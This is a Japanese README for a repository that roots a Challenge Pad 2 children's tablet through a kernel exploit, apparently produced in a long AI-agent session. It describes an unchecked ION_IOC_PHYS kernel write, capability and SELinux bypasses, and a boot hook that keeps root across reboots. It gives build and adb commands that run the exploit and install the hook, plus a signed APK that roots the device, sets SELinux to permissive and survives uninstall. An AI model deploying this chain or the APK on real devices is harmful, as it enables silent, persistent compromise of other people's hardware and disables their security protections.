# charepa-root

チャレンジタッチ / チャレンジパッド2 **TAB-A03-BR2**（Android 5.1、kernel 3.10.33、
Marvell PXA1928、SELinux Enforcing、`user` ビルド）を、UART なしのソフトウェアだけで
永続 root にした記録と、そのときに使ったコード。

```
uid 2000 (shell, CapEff=0)  ->  uid 0, CapEff=0000001fffffffff, enforce=0
                               再起動を跨いで自動復帰（2 回連続で実測）
```

期間は 2026-11-03 10:23 〜 2026-11-07 02:41 (JST)、122 ターン、4,507 ツール呼び出し。
物理アクセスは USB のみで、シリアルコンソール / JTAG / テストポイントは使えない。

## 中身

```
docs/charepa-root-full-story.md     全過程記録（19 章、3,538 行）
docs/charepa-root-source-code.md    src/ のソース全文（SHA-256 付き）
docs/br2-compatibility.md           BR2 で通用するかの静的判定（実機検証は未実施）
docs/README.md                      章立てと読み方
src/tools/                          実機・QEMU で使ったツール 16 本
src/module/                         root 化モジュールのソースと Makefile
src/prebuilt/myroot.ko              実際に動かしたモジュール（156,576 バイト）
charepa-apk/                        APK 1 個で root を取る実装（下記）
Makefile                            make tools / make module KDIR=...
```

## APK（`charepa-apk/`）

上の記録とは別に、**インストールした APK だけで root を取る**実装を同じリポジトリに置いてある。
TAB-A03-BS で実測した。

```
charepa-apk/charepa.apk             出荷物。705,191 バイト、v1/v2/v3 署名済み
charepa-apk/jni/charepa.c           チェーン本体（ION 書き込み→cred→AVC→hook 設置）
charepa-apk/jni/bootpayload.c       起動時に init ドメインで走る payload
charepa-apk/prebuilt/myroot.ko      モジュール（上のものと同じ 507ebb47...）
charepa-apk/tools/br2_verify.sh     BR2 用の 5 段階検証（他機種は拒否）
charepa-apk/tools/consistency.sh    既定値・同梱物・参照パスの整合性検査
```

BS で実測したこと（`charepa-apk/README.md` に根拠付き）:

- 素の端末に APK だけを入れて `all` を実行し、`init_module rc=0` → `/proc/myroot` → `uid=0`
- 再起動後も payload が `u:r:init:s0` で走り root が復帰（10 回以上の再起動・電源断で確認）
- アプリを `pm uninstall` した後も root は残る
- CI が APK をビルド・署名し、その成果物も端末で動作を確認

BR2 では**未検証**。`docs/br2-compatibility.md` に、コードが固定している値と未測定の項目を分けて書いてある。

実験の生データ（`k1`〜`k178` の 168 本、`b*` の 81 本、ログ、33MB のカーネルリーク）と、
他者の公開物から落とした調査メモは含めていない。

## 突破した 4 つの壁

| 壁 | 突破口 | 根拠 |
| --- | --- | --- |
| カーネル書き込み | `ION_IOC_PHYS` が `arg` を検証せずカーネルポインタとして参照し、`data->addr = meta->iova` で書く | `src/tools/k178.c`、本文 8.8.5 節 |
| ケーパビリティ付与 | ストア値 `0x80000000 \| (k<<12)` の `k=16` で `CAP_SYS_MODULE` | `k126`、`k145` |
| SELinux capability 全拒否 | `avc_entry+8` が `tclass=4` なのでゲートで厳密に判定でき、ストアが `avd.allowed` に落ちる | `k178` |
| 永続化 | `file_contexts` にエントリの無い `calibinit.sh` が init ドメインのまま root で走る | `hook5.c` |

書き込める値は `0x80000000` 以上に限られ、ゼロも 1 も書けない。
それが有利に働いたのは `avd.allowed` と `cred->cap_effective` の 2 か所だけだった。
理由は本文の第 14 章にある。

## ビルド

クロスコンパイラだけが必要。ホストは Linux x86_64。

```bash
make tools            # ./build/ に 16 本を aarch64 静的バイナリで出力
file build/k178       # ELF 64-bit LSB executable, ARM aarch64, statically linked
```

モジュールはベンダー GPL ツリー（3.10.33、`.config` / `Module.symvers` を含む）が要る。

```bash
make -C "$KDIR" ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- olddefconfig
make -C "$KDIR" ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- modules_prepare
make module KDIR="$KDIR"
strings -a src/module/myroot.ko | grep vermagic
# vermagic=3.10.33 SMP preempt mod_unload aarch64
```

`src/prebuilt/myroot.ko` は本セッションのビルドそのもの。
SHA-256 `507ebb47b1517389f676524fffa0cb1cb1c22d976176b590153c8966e37307aa`。

## 使い方

```bash
export ADB_SERIAL="$(adb devices | awk 'NR>1 && $2=="device" {print $1; exit}')"

# 1. root を取る（窓指定。当たらなければ隣の窓へ）
adb push build/k178 /data/local/tmp/k178
adb shell "chmod 755 /data/local/tmp/k178"
adb shell "/data/local/tmp/k178 4e000000 50000000"
adb shell "echo 1 > /proc/myroot; id"

# 2. 永続化（/system を rw にして起動フックを置く）
adb push src/prebuilt/myroot.ko /data/local/tmp/myroot.ko
adb push build/modload          /data/local/tmp/modload
adb push build/hook5            /data/local/tmp/hook5
adb shell "/data/local/tmp/hook5"

# 3. 再起動して、何もせずに root か確認
adb reboot && sleep 60
adb shell "cat /proc/modules | grep myroot; cat /sys/fs/selinux/enforce; id"
```

`k178` の窓は `42000000`〜`4f000000` 帯が当たりやすい（実測 10 件、最小 6 ストア）。
`src/tools/hunt2.sh` は窓を順に回すハンターで、`ADB_SERIAL` と `ADB_SUDO=1` で
sudo の有無を切り替える。

## 注意

- **`k138` を実行しないこと。** ゲートが「テスト兼書き込み」であることを
  意図的に壊しながら証明する計器で、端末がパニックする前提。読むだけにする。
- **`broot3` は QEMU 専用。** 実機では `readv` の再確保が安定せず、
  `BINDER_THREAD_EXIT` の番号を直した版でも 5/6 止まり。実機の経路は ION（`k178`）。
- **`k178` は生きたカーネル構造体を壊しうる。** 偽陽性のストア数がそのまま危険度になる。
  938 ストアで 6 秒後にパニック、45 ストアで `/system/bin/toolbox` が後から壊れ、
  6 ストアで無傷だった。
- 復旧経路は `recov.c` で事前に実測してある（recovery が permissive、adbd が
  `u:r:su:s0`、`misc` に `boot-recovery` を書けば入れる）。

## 環境

対象は手元の実機 1 台で、シリアルは本文でも伏せてある。
ホストは SSH 越しの Linux（adb は `sudo -n adb`）、クロスコンパイルは
`aarch64-linux-gnu-gcc 14.2.0 -static -O2`。QEMU には同じベンダーカーネルを
起動して検証した（本文 4.9 節）。

## ライセンス

MIT。`LICENSE` を参照。同梱の `src/prebuilt/myroot.ko` も同じ条件で配布する。
